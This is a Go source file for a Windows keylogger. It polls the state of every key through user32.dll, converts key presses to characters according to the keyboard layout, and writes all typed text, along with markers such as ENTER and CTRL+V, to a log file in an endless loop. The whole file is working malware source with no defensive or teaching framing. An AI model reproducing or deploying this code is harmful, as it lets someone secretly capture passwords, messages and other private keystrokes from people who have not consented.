package keylogger

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unicode/utf8"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

type InitKeylogger struct {
	LogFile string
}

var (
	moduser32 = syscall.NewLazyDLL("user32.dll")

	procGetKeyboardLayout     = moduser32.NewProc("GetKeyboardLayout")
	procGetKeyboardState      = moduser32.NewProc("GetKeyboardState")
	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
	procGetKeyState           = moduser32.NewProc("GetKeyState")
)

func NewKeylogger() Keylogger {
	kl := Keylogger{}

	return kl
}

// Keylogger represents the keylogger
type Keylogger struct {
	lastKey int
}

// Key is a single key entered by the user
type Key struct {
	Empty   bool
	Rune    rune
	Keycode int
}

// GetKey gets the current entered key by the user, if there is any
func (kl *Keylogger) GetKey() Key {

	activeKey := 0
	var keyState uint16

	for i := 0; i < 256; i++ {
		keyState = w32.GetAsyncKeyState(i)

		// Check if the most significant bit is set (key is down)
		// And check if the key is not a non-char key (except for space, 0x20)
		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		} else if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0xD) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		} else if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x8) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		} else if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0xE) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		} else if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0xF) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		} else if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x9) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		} else if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x1B) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		} else if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0xB) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		}
	}

	if activeKey != 0 {
		if activeKey != kl.lastKey {
			kl.lastKey = activeKey
			return kl.ParseKeycode(activeKey, keyState)
		}
	} else {
		kl.lastKey = 0
	}

	return Key{Empty: true}
}

// ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
// That struct contains the Rune for the key
func (kl Keylogger) ParseKeycode(keyCode int, keyState uint16) Key {
	key := Key{Empty: false, Keycode: keyCode}

	// Only one rune has to fit in
	outBuf := make([]uint16, 1)

	// Buffer to store the keyboard state in
	kbState := make([]uint8, 256)

	// Get keyboard layout for this process (0)
	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))

	// Put all key modifier keys inside the kbState list
	if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
		kbState[w32.VK_SHIFT] = 0xFF
	}

	capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	if capitalState != 0 {
		kbState[w32.VK_CAPITAL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
		kbState[w32.VK_CONTROL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
		kbState[w32.VK_MENU] = 0xFF
	}

	_, _, _ = procToUnicodeEx.Call(
		uintptr(keyCode),
		uintptr(0),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&outBuf[0])),
		uintptr(1),
		uintptr(1),
		uintptr(kbLayout))

	key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))

	return key
}

func (k *InitKeylogger) Run() {
	f, err := os.Create(k.LogFile)

	if err != nil {
		fmt.Println(err)
	}

	defer f.Close()

	kl := NewKeylogger()

	for {
		key := kl.GetKey()

		if !key.Empty {
			Rune := fmt.Sprintf("%q", key.Rune)
			s := strings.Split(Rune, "'")[1]
			//KeyCode := fmt.Sprintf("%X", key.Keycode)
			if s == "\\r" {
				//fmt.Println("<ENTER>")

				_, e := f.WriteString("<ENTER>\n")
				if e != nil {
					fmt.Println(e)
				}

			} else if s == "\\b" {
				//fmt.Println("<BACKSPACE>")
				_, e := f.WriteString("<BACKSPACE>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\x03" {
				//fmt.Println("<CTRL+C>")
				_, e := f.WriteString("<CTRL+C>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\x13" {
				//fmt.Println("<CTRL+S>")
				_, e := f.WriteString("<CTRL+S>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\x04" {
				//fmt.Println("<CTRL+D>")
				_, e := f.WriteString("<CTRL+D>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\x01" {
				//fmt.Println("<CTRL+A>")
				_, e := f.WriteString("<CTRL+A>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\x1a" {
				//fmt.Println("<CTRL+Z>")
				_, e := f.WriteString("<CTRL+Z>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\x16" {
				//fmt.Println("<CTRL+V>")
				_, e := f.WriteString("<CTRL+V>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\x06" {
				//fmt.Println("<CTRL+F>")
				_, e := f.WriteString("<CTRL+F>")
				if e != nil {
					fmt.Println(e)
				}
			} else if s == "\\t" {
				//fmt.Println("<TAB>")
				_, e := f.WriteString("<TAB>")
				if e != nil {
					fmt.Println(e)
				}
			} else {
				//fmt.Println(s)
				_, e := f.WriteString(s)
				if e != nil {
					fmt.Println(e)
				}
			}
		}
	}
}
